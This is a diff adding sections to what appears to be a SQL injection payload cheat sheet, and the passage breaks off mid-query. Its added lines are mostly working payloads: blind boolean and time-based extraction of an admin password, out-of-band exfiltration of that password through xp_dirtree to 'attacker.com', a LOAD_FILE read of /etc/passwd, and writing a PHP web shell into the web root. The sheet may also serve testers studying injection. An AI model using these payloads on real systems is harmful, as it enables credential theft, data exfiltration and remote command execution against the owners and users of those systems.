@@ -121,4 +121,42 @@ Trigger database errors to extract information:
 ### **4. Boolean-Based Blind SQLi**
 True/False conditions to infer data:
 ```sql
-' AND SUBSTRING((SELECT password FROM users WHERE username='
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a' -- 
+```
+
+---
+
+### **5. Time-Based Blind SQLi**
+Delay-based inference:
+```sql
+'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a') WAITFOR DELAY '0:0:5' -- 
+```
+
+---
+
+### **6. Out-of-Band Data Exfiltration**
+Exfiltrate data via DNS/HTTP requests:
+```sql
+'; DECLARE @data VARCHAR(1024); SET @data=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') -- 
+```
+
+---
+
+### **7. File System Access**
+Read/write files (if DB permissions allow):
+```sql
+' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL -- 
+'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php' -- 
+```
+
+---
+
+### **8. Database-Specific Payloads**
+
+#### **MySQL / MariaDB**
+```sql
+-- Version check  
+SELECT @@version  
+
+-- List databases  
+SELECT schema_name FROM information
